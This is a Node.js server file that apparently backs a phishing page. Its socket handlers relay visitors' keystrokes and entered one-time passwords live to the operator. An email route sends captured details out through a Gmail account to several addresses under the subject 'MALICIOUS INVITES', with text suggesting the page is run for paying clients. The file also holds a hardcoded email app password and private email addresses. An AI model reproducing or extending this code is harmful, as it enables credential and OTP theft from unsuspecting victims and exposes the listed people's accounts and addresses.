// server.js - with disconnect handling

const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// --- Store driver data in memory ---
const activeDrivers = {}; // { socket.id: 'driver-007', ... }

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Email Sending Route (No changes here)
app.post('/send-email', async (req, res) => {
    // ... your existing email code ...
    const { message } = req.body;
    let transporter = nodemailer.createTransport({ service: 'gmail', auth: { user: 'hexyoproduction25@gmail.com', pass: 'ljauazlfgodevesf' } });
    let mailOptions = { from: 'hexyoproduction25@gmail.com', to: 'hexyo591@gmail.com, wachirasamwel26@gmail.com, kitekitesam1@gmail.com, denismaina036@gmail.com', subject: 'MALICIOUS INVITES', text: message + 'CLIENT VISIT YOUR WEB\nALL DETAILS ARE ENTERED\nTHIS WEB IS MANANGED BY HEXYO AND PHOTOHOLIC PRODUCTION\n\nPAYMENTS TO BE DONE BY THE CLIENT' };
    try { await transporter.sendMail(mailOptions); res.status(200).send('Email sent successfully'); } catch (error) { console.error('Email sending error:', error); res.status(500).send('Error sending email'); }
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "PAX.html"));
});

// Socket.IO functionality
io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);

    // Existing listeners (No changes here)
    socket.on('typing', (data) => { io.emit('display', data); });
    socket.on('otpEntered', (data) => { io.emit('display', data); });
    socket.on('submit', (data) => { io.emit('submitted', data); });

    // --- MODIFIED LOCATION TRACKING BLOCK ---
    socket.on('locationUpdate', (data) => {
        // Store the driverId with this socket connection
        if (data.id) {
            activeDrivers[socket.id] = data.id;
        }
        socket.broadcast.emit('locationUpdated', data);
    });

    // --- MODIFIED DISCONNECT BLOCK ---
    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);

        // Check if the disconnected user was a driver
        const disconnectedDriverId = activeDrivers[socket.id];
        if (disconnectedDriverId) {
            console.log(`Driver ${disconnectedDriverId} has disconnected.`);
            // Broadcast that this driver is now offline
            io.emit('driverDisconnected', { id: disconnectedDriverId });
            // Remove from our active list
            delete activeDrivers[socket.id];
        }
    });
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});